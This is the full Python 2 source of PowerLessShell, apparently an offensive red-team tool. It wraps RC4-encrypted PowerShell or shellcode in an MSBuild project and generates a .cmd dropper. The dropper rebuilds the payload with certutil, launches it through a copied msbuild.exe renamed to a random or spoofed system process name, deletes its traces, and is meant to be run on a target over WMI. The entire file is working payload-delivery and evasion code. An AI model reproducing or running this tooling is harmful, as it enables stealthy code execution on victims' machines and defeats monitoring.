#!/usr/bin/env python2
# Author: Mr.Un1k0d3r - RingZer0 Team 2017

from __future__ import print_function
import random
import string
import base64
import sys
import re
import os

TEMPLATE = "include/template-"
IS_CMD_ARGS = False
USE_KNOWN_PROCESS_NAME = False

class Generator:

        def __init__(self):
                self.error = 0
                self.banner()
                self.chunk_size = 1024

        def clearscreen(self):
                os.system("clear")

        def print_error(self, error):
                print("\033[91m[-] >>> %s\033[00m" % error)

        def banner(self):
                self.clearscreen()
                print("\n\n\033[33mPowerLessShell - Remain Stealth")
                print("         More PowerShell Less Powershell.exe - Mr.Un1k0d3r RingZer0 Team\033[00m")
                print("            ___")
                print("        .-\"; ! ;\"-.")
                print("      .'!  : | :  !`.")
                print("     /\  ! : ! : !  /\\")
                print("    /\ |  ! :|: !  | /\\")
                print("   (  \ \ ; :!: ; / /  )")
                print("  ( `. \ | !:|:! | / .' )")
                print("  (`. \ \ \!:|:!/ / / .')")
                print("   \ `.`.\ |!|! |/,'.' /")
                print("    `._`.\\\!!!// .'_.'")
                print("       `.`.\\|//.'.'")
                print("        |`._`n'_.'|")
                print("        `----^----\"\n\n")

        def set_template(self, path):
                self.data = self.load_file(path, True)
                self.rand_vars()

        def gen_str(self, size):
                return "".join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(size))

        def gen_process(self):
                name = ["csrss.exe","explorer.exe","iexplore.exe","firefox.exe","chrome.exe","lsass.exe","services.exe","smss.exe","spoolsv.exe","svchost.exe","winlogon.exe","wininit.exe","taskmgr.exe","conhost.exe","OUTLOOK.exe", "WINWORD.exe", "EXCEL.exe"]
                return name[random.randrange(0, len(name) - 1)]

        def rand_vars(self):
                for i in reversed(range(1, 50)):
                        self.data = self.data.replace("VAR" + str(i), self.gen_str(random.randrange(5, 25)))

        def get_output(self):
                return self.data

        def gen_rc4_key(self, size):
                return os.urandom(size)

        def format_rc4_key(self, key):
                return "0x" + ", 0x".join(re.findall("..", key.encode("hex")))

        def capture_input(self, mod = "", index = 0):
                if IS_CMD_ARGS:
                        return sys.argv[index]
                if not mod == "":
                        mod = "(%s)" % mod
                return raw_input("\n%s>>> " % mod).strip()

        def load_file(self, path, fatal_error = False):
                data = ""
                try:
                        data = open(path, "rb").read()
                except:
                        self.error = 1
                        self.print_error("%s file not found." % path)
                        if fatal_error:
                                exit(0)
                return data

        def get_error(self):
                if IS_CMD_ARGS and self.error == 1:
                        exit(0)
                current = self.error
                self.error = 0
                return current

        def gen_final_cmd(self, path):
                size = 0
                filepath = []
                for i in xrange(3):
                    filepath.append(self.gen_str(random.randrange(8, 18)))

                # The cmd file first does a quck check for write access to the msbuild folder,
                # if its unavailable use %temp% working directory instead. Next, check if the
                # payload has already been decoded and skip re-creating the file if it exists.
                payload = ("@ECHO OFF\r\n"
                           "set w=0 && set p=\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\\r\n"
                           "copy /Y NUL %p%\\{2} > NUL 2>&1 && set w=1\r\n"
                           "IF %w%==1 (del %p%\\{2}) ELSE (set p=%temp%)\r\n"
                           "set f0=%p%\\{0} && set f1=%p%\\{1}\r\n"
                           "IF EXIST %f1% (GOTO RUN)\r\n"
                           ).format(filepath[0], filepath[1], filepath[2])

                data = self.load_file(path).encode("hex")
                for index, chunk in enumerate(re.findall("." * self.chunk_size, data)):
                        payload += "echo {0} {1} %f0%\r\n".format(chunk, ">" if index == 0 else ">>")
                        size += self.chunk_size
                if len(data) > size:
                        payload += "echo {0} >> %f0%".format(data[(len(data) - size) * -1:])

                if USE_KNOWN_PROCESS_NAME:
                        msbuild = self.gen_process()
                else:
                        msbuild = self.gen_str(random.randrange(5, 25)) + ".exe"
                # Decode paylod, copy msbuild, launch payload, delete files
                payload += ("\r\ncertutil -decodehex %f0% %f1%\r\n"
                            "del %f0%\r\n"
                            "IF %w%==1 (copy %p%\\msbuild.exe %p%\\{0})\r\n"
                            ":RUN\r\n"
                            "IF %w%==1 (%p%\\{0} %f1%) ELSE (\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\msbuild.exe %f1%)\r\n"
                            "del %f1%"
                            ).format(msbuild)
                return payload

        def set_condition(self, data, value = ""):
                if value == "":
                        return data.replace("[CONDITION]", "")
                else:
                        return data.replace("[CONDITION]", ' Condition="\'$(USERDOMAIN)\'==\'%s\'"' % value)

class RC4:

        def KSA(self, key):
                keylength = len(key)
                S = range(256)
                j = 0
                for i in range(256):
                        j = (j + S[i] + key[i % keylength]) % 256
                        S[i], S[j] = S[j], S[i]
                return S

        def PRGA(self, S):
                i = 0
                j = 0
                while True:
                        i = (i + 1) % 256
                        j = (j + S[i]) % 256
                        S[i], S[j] = S[j], S[i]

                        K = S[(S[i] + S[j]) % 256]
                        yield K

        def Encrypt(self, plaintext, key):
                output = ""
                key = [ord(c) for c in key]
                S = self.KSA(key)
                keystream = self.PRGA(S)
                for c in plaintext:
                        output = output + chr(ord(c) ^ keystream.next())
                return output

if __name__ == "__main__":
        gen = Generator()
        input_name = "PowerShell script"
        data = ""

        if len(sys.argv) >= 4:
                IS_CMD_ARGS = True
                if "-knownprocess" in sys.argv:
                        USE_KNOWN_PROCESS_NAME = True
        try:
                if gen.capture_input("Set payload type '(p)owershell, (s)hellcode'", 3) == "s".lower():
                        input_name = "raw shellcode file"
                        TEMPLATE = TEMPLATE + "shellcode.csproj"
                else:
                        TEMPLATE = TEMPLATE + "powershell.csproj"

                gen.set_template(TEMPLATE)
                rc4 = RC4()
                key = gen.gen_rc4_key(32)

                data_path = gen.capture_input("Path to the %s" % input_name, 1)
                data = gen.load_file(data_path, False)
                while gen.get_error():
                        data_path = gen.capture_input("Path to the %s" % input_name)
                        data = gen.load_file(data_path, False)

                outfile = gen.capture_input("Path for the generated MsBuild out file", 2)
                cipher = base64.b64encode(rc4.Encrypt(data, key))
                output = gen.get_output()
                output = output.replace("[KEY]", gen.format_rc4_key(key)).replace("[PAYLOAD]", cipher)
                condition = gen.capture_input("Set USERDOMAIN condition (Default '')", 3).strip()
                output = gen.set_condition(output, condition)

                try:
                        open(outfile, "wb").write(output)
                except:
                        gen.print_error("Failed to write the output to %s" % outfile)

                if not IS_CMD_ARGS:
                        answer = gen.capture_input("Use known process name to perform MsBuild renaming (Default: False)").lower()
                        if answer == "true":
                                USE_KNOWN_PROCESS_NAME = True

                outcmd = gen.gen_final_cmd(outfile)
                try:
                        open(outfile + ".cmd", "wb").write(outcmd)
                except:
                        gen.print_error("Failed to write the output to %s.cmd" % outfile)

                print("\n\n[+] %s was generated.\n[+] %s.cmd was generated.\n[+] Run the command inside of %s.cmd on the target system using WMI." % (outfile, outfile, outfile))
        except KeyboardInterrupt:
                        print("")
                        gen.print_error("Exiting")
                        exit(0)
